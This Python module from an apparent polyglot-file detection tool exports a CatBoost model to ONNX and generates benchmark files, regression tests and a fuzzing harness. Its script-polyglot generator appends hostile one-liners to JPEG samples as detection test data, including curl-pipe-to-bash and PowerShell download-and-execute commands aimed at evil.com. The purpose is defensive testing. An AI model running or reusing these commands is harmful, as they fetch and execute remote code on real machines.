"""
ONNX export support for PolyglotShield ML model.

Converts CatBoost model to ONNX format for:
  - Cross-platform inference
  - Hardware acceleration (ONNX Runtime)
  - Edge deployment
  - Model interoperability

Also: benchmark datasets, CI regression testing, fuzzing harnesses.

Author: Mr-DS-ML-85
"""

import os
import sys
import json
import time
import struct
import math
import hashlib
import random
import logging
import subprocess
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple

logger = logging.getLogger("polyglot_shield.onnx")


# ── ONNX Export ──────────────────────────────────────────────────────────────

class ONNXExporter:
    """Export CatBoost model to ONNX format."""

    def __init__(self, model_path: str = "models/polyglot_shield.cbm"):
        self.model_path = model_path

    def export(self, output_path: str = "models/polyglot_shield.onnx",
               opset_version: int = 13) -> Dict[str, Any]:
        """Export model to ONNX format."""
        try:
            from catboost import CatBoostClassifier
        except ImportError:
            return {"error": "catboost not installed"}

        if not os.path.exists(self.model_path):
            return {"error": f"Model not found: {self.model_path}"}

        model = CatBoostClassifier()
        model.load_model(self.model_path)

        # Get feature names
        feature_count = model.feature_count_
        feature_names = [f"feature_{i}" for i in range(feature_count)]

        try:
            # Export to ONNX
            model.save_model(
                output_path,
                format="onnx",
                export_parameters={
                    "onnx_domain": "ai.catboost",
                    "onnx_model_version": 1,
                    "onnx_doc_string": "PolyglotShield polyglot detection model",
                    "onnx_graph_name": "polyglot_shield",
                }
            )

            file_size = os.path.getsize(output_path)

            # Also export metadata
            meta = {
                "model_type": "CatBoost",
                "feature_count": feature_count,
                "feature_names": feature_names,
                "opset_version": opset_version,
                "output_path": output_path,
                "file_size": file_size,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            }

            meta_path = output_path + ".meta.json"
            with open(meta_path, "w") as f:
                json.dump(meta, f, indent=2)

            return {
                "status": "success",
                "output": output_path,
                "meta": meta_path,
                "size": file_size,
                "features": feature_count,
            }

        except Exception as e:
            # Fallback: try using onnxmltools
            return self._export_via_onnxmltools(model, output_path, feature_count)

    def _export_via_onnxmltools(self, model, output_path, feature_count) -> Dict[str, Any]:
        """Fallback export using onnxmltools."""
        try:
            from onnxmltools import convert_catboost
            from onnxmltools.convert.common.data_types import FloatTensorType

            initial_type = [("features", FloatTensorType([None, feature_count]))]
            onnx_model = convert_catboost(model, initial_types=initial_type)

            with open(output_path, "wb") as f:
                f.write(onnx_model.SerializeToString())

            return {
                "status": "success",
                "output": output_path,
                "size": os.path.getsize(output_path),
                "features": feature_count,
            }
        except ImportError:
            return {"error": "Neither catboost native ONNX export nor onnxmltools available. "
                    "Install: pip install onnxmltools onnxruntime"}
        except Exception as e:
            return {"error": f"ONNX export failed: {e}"}

    def validate(self, onnx_path: str, test_data=None) -> Dict[str, Any]:
        """Validate exported ONNX model."""
        try:
            import onnxruntime as ort
        except ImportError:
            return {"error": "onnxruntime not installed. pip install onnxruntime"}

        if not os.path.exists(onnx_path):
            return {"error": f"ONNX model not found: {onnx_path}"}

        try:
            session = ort.InferenceSession(onnx_path)
            input_info = session.get_inputs()[0]
            output_info = session.get_outputs()[0]

            result = {
                "status": "valid",
                "input_name": input_info.name,
                "input_shape": input_info.shape,
                "input_type": input_info.type,
                "output_name": output_info.name,
                "output_shape": output_info.shape,
                "providers": session.get_providers(),
            }

            # Test inference
            if test_data is not None:
                import numpy as np
                if isinstance(test_data, list):
                    test_data = np.array(test_data, dtype=np.float32)
                start = time.time()
                outputs = session.run(None, {input_info.name: test_data})
                elapsed = time.time() - start
                result["inference_time_ms"] = round(elapsed * 1000, 2)
                result["output_shape_actual"] = [o.shape for o in outputs]

            return result

        except Exception as e:
            return {"error": f"ONNX validation failed: {e}"}


# ── Benchmark Dataset Generator ──────────────────────────────────────────────

class BenchmarkGenerator:
    """Generate benchmark test datasets for regression testing."""

    BENCHMARK_TYPES = {
        # (name, description, generator_fn)
        "clean_images": "Clean image files (JPEG, PNG, GIF, BMP)",
        "polyglot_pe": "PE-in-image polyglots",
        "polyglot_elf": "ELF-in-image polyglots",
        "polyglot_script": "Script-in-image polyglots (bash, python, VBS)",
        "polyglot_office": "Office macro documents",
        "polyglot_archive": "Nested archives and archive bombs",
        "stego_lsb": "LSB steganography samples",
        "packed_executables": "Packed/encrypted PE/ELF files",
        "clean_documents": "Clean PDF, DOCX, XLSX files",
        "malicious_rtf": "RTF exploit samples",
    }

    def generate(self, output_dir: str = "benchmark",
                 samples_per_type: int = 10) -> Dict[str, Any]:
        """Generate benchmark dataset."""
        os.makedirs(output_dir, exist_ok=True)
        manifest = {"generated": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "samples_per_type": samples_per_type, "tests": {}}

        # Import engines
        sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        try:
            from engines.features import extract_features
            from engines.yara_engine import YaraEngine
            from engines.format_parser import FormatParser
            yara = YaraEngine()
            parser = FormatParser()
        except ImportError:
            return {"error": "Could not import engines"}

        tests = {}

        # 1. Clean images
        tests["clean_images"] = self._gen_clean_images(output_dir, samples_per_type)

        # 2. PE polyglots
        tests["polyglot_pe"] = self._gen_pe_polyglots(output_dir, samples_per_type)

        # 3. Script polyglots
        tests["polyglot_script"] = self._gen_script_polyglots(output_dir, samples_per_type)

        manifest["tests"] = tests
        manifest["total_files"] = sum(t.get("count", 0) for t in tests.values())

        # Save manifest
        manifest_path = os.path.join(output_dir, "manifest.json")
        with open(manifest_path, "w") as f:
            json.dump(manifest, f, indent=2)

        return manifest

    def _gen_clean_images(self, outdir: str, n: int) -> Dict:
        """Generate clean image files."""
        count = 0
        for i in range(n):
            # Minimal JPEG
            jpeg = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
            jpeg += os.urandom(random.randint(1024, 4096)) + b"\xff\xd9"
            path = os.path.join(outdir, f"clean_jpeg_{i}.jpg")
            with open(path, "wb") as f:
                f.write(jpeg)
            count += 1

            # Minimal PNG
            png = b"\x89PNG\r\n\x1a\n" + os.urandom(64) + b"IEND" + b"\x00" * 4
            path = os.path.join(outdir, f"clean_png_{i}.png")
            with open(path, "wb") as f:
                f.write(png)
            count += 1

        return {"count": count, "expected_detections": 0}

    def _gen_pe_polyglots(self, outdir: str, n: int) -> Dict:
        """Generate PE-in-image polyglots."""
        count = 0
        for i in range(n):
            jpeg = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
            jpeg += os.urandom(2048) + b"\xff\xd9"
            pe = b"MZ" + os.urandom(1024)
            path = os.path.join(outdir, f"poly_pe_jpeg_{i}.jpg")
            with open(path, "wb") as f:
                f.write(jpeg + pe)
            count += 1
        return {"count": count, "expected_detections": count}

    def _gen_script_polyglots(self, outdir: str, n: int) -> Dict:
        """Generate script-in-image polyglots."""
        scripts = [
            b"#!/bin/bash\ncurl http://evil.com/payload | bash\n",
            b"#!/usr/bin/env python3\nimport os; os.system('id')\n",
            b'WScript.CreateObject("WScript.Shell").Run "cmd /c calc"\n',
            b"powershell -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://evil.com\")'\n",
        ]
        count = 0
        for i in range(n):
            jpeg = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
            jpeg += os.urandom(2048) + b"\xff\xd9"
            script = scripts[i % len(scripts)]
            path = os.path.join(outdir, f"poly_script_{i}.jpg")
            with open(path, "wb") as f:
                f.write(jpeg + script)
            count += 1
        return {"count": count, "expected_detections": count}


# ── CI Regression Testing ────────────────────────────────────────────────────

class CIRegressionTester:
    """Run regression tests against benchmark datasets."""

    def __init__(self, project_root: str = "."):
        self.project_root = project_root

    def run(self, benchmark_dir: str = "benchmark") -> Dict[str, Any]:
        """Run full regression test suite."""
        results = {"timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                   "tests": [], "passed": 0, "failed": 0, "total": 0}

        # Load manifest
        manifest_path = os.path.join(benchmark_dir, "manifest.json")
        if not os.path.exists(manifest_path):
            return {"error": f"Benchmark manifest not found: {manifest_path}"}

        with open(manifest_path) as f:
            manifest = json.load(f)

        # Import scanner
        sys.path.insert(0, self.project_root)
        try:
            from polyglot_tui import PolyglotDetector, PolyglotSanitizer
            detector = PolyglotDetector()
            sanitizer = PolyglotSanitizer()
        except ImportError:
            return {"error": "Could not import PolyglotShield"}

        # Test each benchmark category
        for test_name, test_info in manifest.get("tests", {}).items():
            expected_detections = test_info.get("expected_detections", 0)
            actual_detections = 0

            # Find generated files for this test
            test_files = []
            for f in os.listdir(benchmark_dir):
                if f.startswith(test_name.replace("clean_", "clean_").replace("polyglot_", "poly_")):
                    test_files.append(os.path.join(benchmark_dir, f))

            if not test_files:
                # Try prefix matching
                prefixes = {
                    "clean_images": "clean_",
                    "polyglot_pe": "poly_pe_",
                    "polyglot_script": "poly_script_",
                }
                prefix = prefixes.get(test_name, test_name[:8])
                test_files = [os.path.join(benchmark_dir, f)
                             for f in os.listdir(benchmark_dir)
                             if f.startswith(prefix)]

            for fpath in test_files[:50]:  # Limit
                try:
                    findings = detector.scan_file(fpath)
                    crit = [f for f in findings if f["severity"] == "critical"]
                    if crit:
                        actual_detections += 1
                except Exception:
                    pass

            test_passed = actual_detections >= expected_detections
            test_result = {
                "name": test_name,
                "expected": expected_detections,
                "actual": actual_detections,
                "status": "PASS" if test_passed else "FAIL",
                "files_tested": len(test_files),
            }
            results["tests"].append(test_result)
            results["total"] += 1
            if test_passed:
                results["passed"] += 1
            else:
                results["failed"] += 1

        return results


# ── Fuzzing Harness ──────────────────────────────────────────────────────────

class FuzzingHarness:
    """Fuzzing harness for PolyglotShield components."""

    def __init__(self, project_root: str = "."):
        self.project_root = project_root

    def fuzz_file_formats(self, iterations: int = 100) -> Dict[str, Any]:
        """Fuzz file format parsers with random/mutated inputs."""
        sys.path.insert(0, self.project_root)
        try:
            from polyglot_tui import PolyglotDetector, PolyglotSanitizer
            from engines.format_parser import FormatParser
            detector = PolyglotDetector()
            sanitizer = PolyglotSanitizer()
            parser = FormatParser()
        except ImportError:
            return {"error": "Could not import engines"}

        results = {"iterations": iterations, "crashes": 0, "errors": 0,
                   "handled": 0, "crash_details": []}

        for i in range(iterations):
            # Generate random/mutated data
            data = self._mutate_input()

            try:
                # Write to temp file
                tmp = f"/tmp/fuzz_{i}.bin"
                with open(tmp, "wb") as f:
                    f.write(data)

                # Test all engines
                try:
                    detector.scan_file(tmp)
                except Exception as e:
                    results["errors"] += 1

                try:
                    sanitizer.sanitize(tmp, backup=False)
                except Exception as e:
                    results["errors"] += 1

                try:
                    parser.differential_analysis(tmp)
                except Exception as e:
                    results["errors"] += 1

                results["handled"] += 1

                # Cleanup
                os.unlink(tmp)

            except Exception as e:
                results["crashes"] += 1
                results["crash_details"].append({
                    "iteration": i,
                    "error": str(e)[:200],
                    "data_size": len(data),
                    "data_preview": data[:32].hex(),
                })

        return results

    def _mutate_input(self) -> bytes:
        """Generate mutated input for fuzzing."""
        mutation_type = random.randint(0, 7)

        if mutation_type == 0:
            # Random bytes
            return os.urandom(random.randint(1, 65536))

        elif mutation_type == 1:
            # Valid JPEG + random trailing
            jpeg = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
            return jpeg + os.urandom(random.randint(0, 32768)) + b"\xff\xd9" + os.urandom(random.randint(0, 8192))

        elif mutation_type == 2:
            # Valid PNG + random data
            png = b"\x89PNG\r\n\x1a\n" + os.urandom(random.randint(1, 1024))
            return png + os.urandom(random.randint(0, 16384))

        elif mutation_type == 3:
            # PE header + random sections
            pe = b"MZ" + os.urandom(58) + struct.pack("<I", 64) + b"PE\x00\x00"
            return pe + os.urandom(random.randint(0, 32768))

        elif mutation_type == 4:
            # ZIP header + random
            return b"PK\x03\x04" + os.urandom(random.randint(4, 65536))

        elif mutation_type == 5:
            # Multiple format headers (polyglot)
            headers = [b"MZ", b"%PDF", b"\x89PNG", b"PK\x03\x04", b"\xff\xd8"]
            result = b""
            for _ in range(random.randint(2, 5)):
                result += random.choice(headers) + os.urandom(random.randint(0, 4096))
            return result

        elif mutation_type == 6:
            # Byte-flip mutation of a valid JPEG
            jpeg = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
            jpeg += os.urandom(2048) + b"\xff\xd9"
            result = bytearray(jpeg)
            for _ in range(random.randint(1, 100)):
                pos = random.randint(0, len(result) - 1)
                result[pos] = random.randint(0, 255)
            return bytes(result)

        else:
            # Empty / minimal
            return os.urandom(random.randint(0, 10))
